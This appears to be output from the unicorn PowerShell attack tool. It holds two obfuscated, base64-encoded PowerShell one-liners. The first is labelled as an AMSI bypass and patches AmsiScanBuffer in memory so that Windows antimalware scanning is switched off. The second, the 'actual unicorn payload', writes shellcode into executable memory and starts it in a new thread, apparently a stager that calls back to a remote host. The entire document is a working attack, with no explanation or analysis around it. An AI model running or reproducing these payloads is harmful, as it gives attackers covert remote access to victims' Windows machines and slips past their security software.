# AMSI bypass code - run in same process as unicorn second stage
powershell /w 1 /C "sv ZBZ -;sv JW ec;sv iQ ((gv ZBZ).value.toString()+(gv JW).value.toString());powershell (gv iQ).value.toString() ('JABRAHYAUABBAGEARQBVACAAPQAgAEAAIgAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFcAaQBuADMAMgAgAHsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACgASQBuAHQAUAB0AHIAIABoAE0AbwBkAHUAbABlACwAIABzAHQAcgBpAG4AZwAgAHAAcgBvAGMATgBhAG0AZQApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyACIAKQBdACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABMAG8AYQBkAEwAaQBiAHIAYQByAHkAKABzAHQAcgBpAG4AZwAgAG4AYQBtAGUAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABJAG4AdABQAHQAcgAgAGwAcABBAGQAZAByAGUAcwBzACwAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABmAGwATgBlAHcAUAByAG8AdABlAGMAdAAsACAAbwB1AHQAIAB1AGkAbgB0ACAAbABwAGYAbABPAGwAZABQAHIAbwB0AGUAYwB0ACkAOwB9AAoAIgBAAAoAQQBkAGQALQBUAHkAcABlACAAJABRAHYAUABBAGEARQBVADsAJABNAG8AdwBzAGEATgBaAFgAVwAgAD0AIABbAFcAaQBuADMAMgBdADoAOgBHAGUAdABQAHIAbwBjAEEAZABkAHIAZQBzAHMAKABbAFcAaQBuADMAMgBdADoAOgBMAG8AYQBkAEwAaQBiAHIAYQByAHkAKAAiAEEAbQAiACsAIgBzACIAKwAiAGkALgAiACsAIgBkACIAKwAiAGwAbAAiACkALAAgACIAQQBtACIAKwAiAHMAIgArACIAaQBTACIAKwAiAGMAIgArACIAYQBuAEIAdQAiACsAIgBmACIAKwAiAGYAZQByACIAKQA7ACQAUABKAHMAdwByAEsAWgBTAEsAIAA9ACAAMAA7AFsAVwBpAG4AMwAyAF0AOgA6AFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAoACQATQBvAHcAcwBhAE4AWgBYAFcALAAgAFsAdQBpAG4AdAAzADIAXQBbAHUAaQBuAHQAMwAyAF0ANQAsACAAMAB4ADQAMAAsACAAWwByAGUAZgBdACQAUABKAHMAdwByAEsAWgBTAEsAKQA7ACQAZwBxAEkAZABvAHoAYgBYACAAPQAgACgAIgB9AHgAYQBFAHcAZwBwAG8AYgBIAEQALAAgAH0AeAB5AFcAVwB3AGUAVAAsACAAfQB4AH0AfQAsACAAfQB4AH0ANwAsACAAfQB4ADgAfQAsACAAfQB4AEMAMwAiACkALgByAGUAcABsAGEAYwBlACgAIgB5AFcAVwB3AGUAVAAiACwAIAAiADUANwAiACkALgByAGUAcABsAGEAYwBlACgAIgB9ACIALAAgACIAMAAiACkALgByAGUAcABsAGEAYwBlACgAIgBhAEUAdwBnAHAAbwBiAEgARAAiACwAIAAiAEIAOAAiACkAOwAkAGcAcQBJAGQAbwB6AGIAWAAgAD0AIABbAEIAeQB0AGUAWwBdAF0AKAAkAGcAcQBJAGQAbwB6AGIAWAApAC4AcwBwAGwAaQB0ACgAIgAsACIAKQA7AFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AEMAbwBwAHkAKAAkAGcAcQBJAGQAbwB6AGIAWAAsACAAMAAsACAAJABNAG8AdwBzAGEATgBaAFgAVwAsACAANgApAA==')"

# actual unicorn payload
powershell /w 1 /C "sv ZBZ -;sv JW ec;sv iQ ((gv ZBZ).value.toString()+(gv JW).value.toString());powershell (gv iQ).value.toString() ('JABGAFAAPQAnACQAQQBKAD0AJwAnAFsARABsAGwASQBtAHAAbwByAHQAKAAoACIAbQBzACIAKwAiAHYAIgArACIAYwByAHQALgBkAGwAbAAiACkAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAYwBhAGwAbABvAGMAKAB1AGkAbgB0ACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABhAG0AbwB1AG4AdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAIgArACIAbgAiACsAIgBlAGwAMwAyAC4AZABsAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZAAoAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEEAdAB0AHIAaQBiAHUAdABlAHMALAAgAHUAaQBuAHQAIABkAHcAUwB0AGEAYwBrAFMAaQB6AGUALAAgAEkAbgB0AFAAdAByACAAbABwAFMAdABhAHIAdABBAGQAZAByAGUAcwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABQAGEAcgBhAG0AZQB0AGUAcgAsACAAdQBpAG4AdAAgAGQAdwBDAHIAZQBhAHQAaQBvAG4ARgBsAGEAZwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABJAGQAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByACIAKwAiAG4AIgArACIAZQBsADMAMgAuAGQAbABsACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABOAGUAdwBQAHIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAHUAaQBuAHQAIAB6AGQAegApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQBzACIAKwAiAHYAIgArACIAYwByAHQALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAYQBZAD0AIgB9AGUAOAAsAH0AOABmACwAfQAwADAALAB9ADAAMAAsAH0AMAAwACwAfQA2ADAALAB9ADMAMQAsAH0AZAAyACwAfQA4ADkALAB9AGUANQAsAH0ANgA0ACwAfQA4AGIALAB9ADUAMgAsAH0AMwAwACwAfQA4AGIALAB9ADUAMgAsAH0AMABjACwAfQA4AGIALAB9ADUAMgAsAH0AMQA0ACwAfQAwAGYALAB9AGIANwAsAH0ANABhACwAfQAyADYALAB9ADgAYgAsAH0ANwAyACwAfQAyADgALAB9ADMAMQAsAH0AZgBmACwAfQAzADEALAB9AGMAMAAsAH0AYQBjACwAfQAzAGMALAB9ADYAMQAsAH0ANwBjACwAfQAwADIALAB9ADIAYwAsAH0AMgAwACwAfQBjADEALAB9AGMAZgAsAH0AMABkACwAfQAwADEALAB9AGMANwAsAH0ANAA5ACwAfQA3ADUALAB9AGUAZgAsAH0ANQAyACwAfQA1ADcALAB9ADgAYgAsAH0ANQAyACwAfQAxADAALAB9ADgAYgAsAH0ANAAyACwAfQAzAGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAMAAsAH0ANwA4ACwAfQA4ADUALAB9AGMAMAAsAH0ANwA0ACwAfQA0AGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAOAAsAH0AMQA4ACwAfQA1ADAALAB9ADgAYgAsAH0ANQA4ACwAfQAyADAALAB9ADAAMQAsAH0AZAAzACwAfQA4ADUALAB9AGMAOQAsAH0ANwA0ACwAfQAzAGMALAB9ADQAOQAsAH0AOABiACwAfQAzADQALAB9ADgAYgAsAH0AMwAxACwAfQBmAGYALAB9ADAAMQAsAH0AZAA2ACwAfQAzADEALAB9AGMAMAAsAH0AYQBjACwAfQBjADEALAB9AGMAZgAsAH0AMABkACwAfQAwADEALAB9AGMANwAsAH0AMwA4ACwAfQBlADAALAB9ADcANQAsAH0AZgA0ACwAfQAwADMALAB9ADcAZAAsAH0AZgA4ACwAfQAzAGIALAB9ADcAZAAsAH0AMgA0ACwAfQA3ADUALAB9AGUAMAAsAH0ANQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgA0ACwAfQAwADEALAB9AGQAMwAsAH0ANgA2ACwAfQA4AGIALAB9ADAAYwAsAH0ANABiACwAfQA4AGIALAB9ADUAOAAsAH0AMQBjACwAfQAwADEALAB9AGQAMwAsAH0AOABiACwAfQAwADQALAB9ADgAYgAsAH0AMAAxACwAfQBkADAALAB9ADgAOQAsAH0ANAA0ACwAfQAyADQALAB9ADIANAAsAH0ANQBiACwAfQA1AGIALAB9ADYAMQAsAH0ANQA5ACwAfQA1AGEALAB9ADUAMQAsAH0AZgBmACwAfQBlADAALAB9ADUAOAAsAH0ANQBmACwAfQA1AGEALAB9ADgAYgAsAH0AMQAyACwAfQBlADkALAB9ADgAMAAsAH0AZgBmACwAfQBmAGYALAB9AGYAZgAsAH0ANQBkACwAfQA2ADgALAB9ADMAMwAsAH0AMwAyACwAfQAwADAALAB9ADAAMAAsAH0ANgA4ACwAfQA3ADcALAB9ADcAMwAsAH0AMwAyACwAfQA1AGYALAB9ADUANAAsAH0ANgA4ACwAfQA0AGMALAB9ADcANwAsAH0AMgA2ACwAfQAwADcALAB9ADgAOQAsAH0AZQA4ACwAfQBmAGYALAB9AGQAMAAsAH0AYgA4ACwAfQA5ADAALAB9ADAAMQAsAH0AMAAwACwAfQAwADAALAB9ADIAOQAsAH0AYwA0ACwAfQA1ADQALAB9ADUAMAAsAH0ANgA4ACwAfQAyADkALAB9ADgAMAAsAH0ANgBiACwAfQAwADAALAB9AGYAZgAsAH0AZAA1ACwAfQA2AGEALAB9ADAAYQAsAH0ANgA4ACwAfQBjADAALAB9AGEAOAAsAH0AYQBlACwAfQA4ADEALAB9ADYAOAAsAH0AMAAyACwAfQAwADAALAB9ADEAMQAsAH0ANQBjACwAfQA4ADkALAB9AGUANgAsAH0ANQAwACwAfQA1ADAALAB9ADUAMAAsAH0ANQAwACwAfQA0ADAALAB9ADUAMAAsAH0ANAAwACwAfQA1ADAALAB9ADYAOAAsAH0AZQBhACwAfQAwAGYALAB9AGQAZgAsAH0AZQAwACwAfQBmAGYALAB9AGQANQAsAH0AOQA3ACwAfQA2AGEALAB9ADEAMAAsAH0ANQA2ACwAfQA1ADcALAB9ADYAOAAsAH0AOQA5ACwAfQBhADUALAB9ADcANAAsAH0ANgAxACwAfQBmAGYALAB9AGQANQAsAH0AOAA1ACwAfQBjADAALAB9ADcANAAsAH0AMABhACwAfQBmAGYALAB9ADQAZQAsAH0AMAA4ACwAfQA3ADUALAB9AGUAYwAsAH0AZQA4ACwAfQA2ADcALAB9ADAAMAAsAH0AMAAwACwAfQAwADAALAB9ADYAYQAsAH0AMAAwACwAfQA2AGEALAB9ADAANAAsAH0ANQA2ACwAfQA1ADcALAB9ADYAOAAsAH0AMAAyACwAfQBkADkALAB9AGMAOAAsAH0ANQBmACwAfQBmA'+'GYALAB9AGQANQAsAH0AOAAzACwAfQBmADgALAB9ADAAMAAsAH0ANwBlACwAfQAzADYALAB9ADgAYgAsAH0AMwA2ACwAfQA2AGEALAB9ADQAMAAsAH0ANgA4ACwAfQAwADAALAB9ADEAMAAsAH0AMAAwACwAfQAwADAALAB9ADUANgAsAH0ANgBhACwAfQAwADAALAB9ADYAOAAsAH0ANQA4ACwAfQBhADQALAB9ADUAMwAsAH0AZQA1ACwAfQBmAGYALAB9AGQANQAsAH0AOQAzACwAfQA1ADMALAB9ADYAYQAsAH0AMAAwACwAfQA1ADYALAB9ADUAMwAsAH0ANQA3ACwAfQA2ADgALAB9ADAAMgAsAH0AZAA5ACwAfQBjADgALAB9ADUAZgAsAH0AZgBmACwAfQBkADUALAB9ADgAMwAsAH0AZgA4ACwAfQAwADAALAB9ADcAZAAsAH0AMgA4ACwAfQA1ADgALAB9ADYAOAAsAH0AMAAwACwAfQA0ADAALAB9ADAAMAAsAH0AMAAwACwAfQA2AGEALAB9ADAAMAAsAH0ANQAwACwAfQA2ADgALAB9ADAAYgAsAH0AMgBmACwAfQAwAGYALAB9ADMAMAAsAH0AZgBmACwAfQBkADUALAB9ADUANwAsAH0ANgA4ACwAfQA3ADUALAB9ADYAZQAsAH0ANABkACwAfQA2ADEALAB9AGYAZgAsAH0AZAA1ACwAfQA1AGUALAB9ADUAZQAsAH0AZgBmACwAfQAwAGMALAB9ADIANAAsAH0AMABmACwAfQA4ADUALAB9ADcAMAAsAH0AZgBmACwAfQBmAGYALAB9AGYAZgAsAH0AZQA5ACwAfQA5AGIALAB9AGYAZgAsAH0AZgBmACwAfQBmAGYALAB9ADAAMQAsAH0AYwAzACwAfQAyADkALAB9AGMANgAsAH0ANwA1ACwAfQBjADEALAB9AGMAMwAsAH0AYgBiACwAfQBmADAALAB9AGIANQAsAH0AYQAyACwAfQA1ADYALAB9ADYAYQAsAH0AMAAwACwAfQA1ADMALAB9AGYAZgAsAH0AZAA1ACIAOwAkAEIAcgA9AEEAZABkAC0AVAB5AHAAZQAgAC0AcABhAHMAcwAgAC0AbQAgACQAQQBKACAALQBOAGEAbQBlACAAIgBzAGgAIgAgAC0AbgBhAG0AZQBzACAAZwBxAG8AOwAkAEIAcgA9ACQAQgByAC4AcgBlAHAAbABhAGMAZQAoACIAZwBxAG8AIgAsACAAIgBXAGkAbgAzADIARgB1AG4AYwB0AGkAbwBuAHMAIgApADsAWwBiAHkAdABlAFsAXQBdACQAYQBZACAAPQAgACQAYQBZAC4AcgBlAHAAbABhAGMAZQAoACIAfQAiACwAIgBqAE0ATgB4ACIAKQAuAHIAZQBwAGwAYQBjAGUAKAAiAGoATQBOACIALAAgACIAMAAiACkALgBTAHAAbABpAHQAKAAiACwAIgApADsAJABIAHQAPQAwAHgAMQAwADAAMQA7AGkAZgAgACgAJABhAFkALgBMACAALQBnAHQAIAAwAHgAMQAwADAAMQApAHsAJABIAHQAPQAkAGEAWQAuAEwAfQA7ACQAYgB4AD0AJABCAHIAOgA6AGMAYQBsAGwAbwBjACgAMAB4ADEAMAAwADEALAAgADEAKQA7AFsAVQBJAG4AdAA2ADQAXQAkAHoAZAB6ACAAPQAgADAAOwBmAG8AcgAoACQAZgBWAD0AMAA7ACQAZgBWACAALQBsAGUAKAAkAGEAWQAuAEwAZQBuAGcAdABoAC0AMQApADsAJABmAFYAKwArACkAewAkAEIAcgA6ADoAbQBlAG0AcwBlAHQAKABbAEkAbgB0AFAAdAByAF0AKAAkAGIAeAAuAFQAbwBJAG4AdAAzADIAKAApACsAJABmAFYAKQAsACAAJABhAFkAWwAkAGYAVgBdACwAIAAxACkAfQA7ACQAQgByADoAOgBWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKAAkAGIAeAAsACAAMAB4ADEAMAAwADEALAAgADAAeAA0ADAALAAgAFsAUgBlAGYAXQAkAHoAZAB6ACkAOwAkAFcAYwBkAD0AWwBpAG4AdABdADAAeAAwADAAOwAkAEIAcgA6ADoAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQAKABbAGkAbgB0AF0AMAAsACQAVwBjAGQALAAkAGIAeAAsADAALAAwACwAMQAtADEAKQA7ACcAOwAkAGkARAA9AFsAQwBvAG4AdgBlAHIAdABdADoAOgBUAG8AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBuAGkAYwBvAGQAZQAuAEcAZQB0AEIAeQB0AGUAcwAoACQARgBQACkAKQA7ACQAQwBLAD0AIgBwAG8AdwBlAHIAcwBoAGUAbABsACIAOwAkAHcASgA9ACIAVwBpAG4AZABvAHcAcwAiADsAJABtAGYAYQAgAD0AIAAiAEMAOgBcACQAdwBKAFwAYQBsAHUAbwB2AEwAWQBcACQAdwBKACQAQwBLAFwAdgAxAC4AMABcACQAQwBLACIAOwAkAG0AZgBhACAAPQAgACQAbQBmAGEALgByAGUAcABsAGEAYwBlACgAIgBhAGwAdQBvACIALAAgACIAcwB5AHMAIgApADsAJABtAGYAYQAgAD0AIAAkAG0AZgBhAC4AcgBlAHAAbABhAGMAZQAoACIAdgBMAFkAIgAsACAAIgB3AG8AdwA2ADQAIgApADsAJAB5AHYAWABEACAAPQAgACcAVAByACIAKwAiAHUAIgArACIAZQAnADsAaQBmACgAWwBlAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoASQBzADYANABCAGkAdABPAHAAZQByAGEAdABpAG4AZwBTAHkAcwB0AGUAbQAgAC0AZQBxACAAJwAkAHkAdgBYAEQAJwApAHsAJABDAEsAPQAgACQAbQBmAGEAfQA7ACQAdQBsAD0AIgAgACQAQwBLACAAWgBTAFgAIAAkAGkARAAiADsAJAB1AGwAPQAkAHUAbAAuAHIAZQBwAGwAYQBjAGUAKAAiAFoAUwBYACIALAAgACIALQBuAG8AZQB4AGkAdAAgAC0AZQAiACkAOwBpAGUAeAAgACQAdQBsAA'+'==')"